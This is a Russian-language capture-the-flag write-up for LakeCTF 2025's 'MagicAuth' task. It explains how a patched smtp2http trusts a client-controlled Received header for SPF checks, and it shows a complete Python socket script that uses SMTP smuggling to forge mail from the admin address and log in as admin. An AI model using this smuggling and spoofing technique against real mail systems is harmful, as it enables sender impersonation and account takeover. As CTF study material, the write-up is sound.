# MagicAuth
**LakeCTF 2025**

Задание представляет собой систему аутентификации на основе email. В системе есть следующие сервисы:
* `web` (FastAPI + React) - интерфейс для регистрации/входа по email
* `mta` (Mail Transfer Agent) - SMTP-сервер, принимающий письма от пользователей
* `smtp2http` - сервис, который принимает письма от MTA и отправляет их через webhook на веб-приложение

Система позволяет аутентифицироваться, отправив email на специальный адрес magic@auth.ctf.cx. Прочитать флаг может администратор - пользователь с почтой admin@auth.ctf.cx.

Аутентификация происходит следующим образом:
1. Пользователь инициирует аутентификацию через `web`
2. Система генерирует уникальный токен и ожидает email с определенным `subject`
3. Пользователь отправляет email на magic@auth.ctf.cx
4. `mta` принимает письмо, обрабатывает и пересылает в `smtp2http`
5. `smtp2http` парсит письмо и отправляет HTTP-запрос на `web`
6. `web` проверяет токен и аутентифицирует пользователя

При этом в исходниках дан `diff.patch` для пакета `smtp2http`. В нем нужно обратить внимание на следующий кусок кода:
```
+           // replace source IP with the one from Received header because there is an additional MTA in front
+           var spfResult spf.Result = spf.None
+           receivedAddr := msg.Header.Get("Received")
+           if receivedAddr == "" {
+               spfResult, _, _ = c.SPF()
+           } else {
+               _, host, err := smtpsrv.SplitAddress(c.From().Address)
+               if err == nil {
+                   spfResult, _, _ = spf.CheckHost(net.ParseIP(receivedAddr), host, c.From().Address)
+               }
+           }
```
Измененный `smtp2http` берет адрес отправителя письма из заголовка `Received`, который мы можем изменить. Посмотрим как этот заголовок обрабатывает `mta`:
```
# Security: Remove any existing Received headers to prevent spoofing
# Only the last MTA's Received header should be trusted
if 'Received' in msg:
    del msg['Received']

msg['Received'] = client_ip
```
`mta` удаляет существующие заголовки `Received` и добавляет новый с IP клиента. Однако `mta` не умеет корректно разделять SMTP пакеты, поэтому мы може отправить два письма в одном пакете, разделив их стандартным разделителем в SMTP: `\n\n`. Таким образом мы можем реализовать SMTP Smuggling:
1. Формируем легитимное письмо без заголовка `Received`
2. Добавляем разделитель `\n\n`, чтобы SMTP обработчик понял, что перед ним 2 письма, а `mta` пропустил бы пакет как одно письмо
3. Добавляем второе письмо с заголовком `Received`
4. Отправляем письмо в рамках одного SMTP запроса

Пытаемся залогиниться, получаем случайный логин в интерфейсе вставляем его в письмо для авторизации как админ и запускаем скрипт:
```
import socket

SERVER = "0.0.0.0"
PORT = 25          

def recv(s):
    data = s.recv(1024).decode()
    print(data, end="")
    return data

def send(s, msg):
    print("> " + msg.replace('\r', '\\r').replace('\n', '\\n'))
    s.send((msg).encode())

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((SERVER, PORT))
    recv(s)
    send(s, "HELO zeus\r\n")
    recv(s)
    send(s, "MAIL FROM:<admin@auth.ctf.cx>\r\n")
    recv(s)
    send(s, "RCPT TO:<magic@auth.ctf.cx>\r\n")
    recv(s)
    send(s, "DATA\r\n")
    recv(s)
    send(s, "Subject: test\r\n")
    send(s, "\r\n")
    send(s, "Hola!\n.\n")  
    send(s, "MAIL FROM:<admin@auth.ctf.cx>\r\n")
    send(s, "RCPT TO:<magic@auth.ctf.cx>\r\n")
    send(s, "DATA\r\n")
    send(s, "Subject: login:KjJUVtQgJig3WkXUL0BMjA\r\nReceived: 1.3.3.7\r\n\r\nSmuggled!\r\n.\r\n")
    send(s, "QUIT\r\n")
    recv(s)
```

#web #smtp #smuggling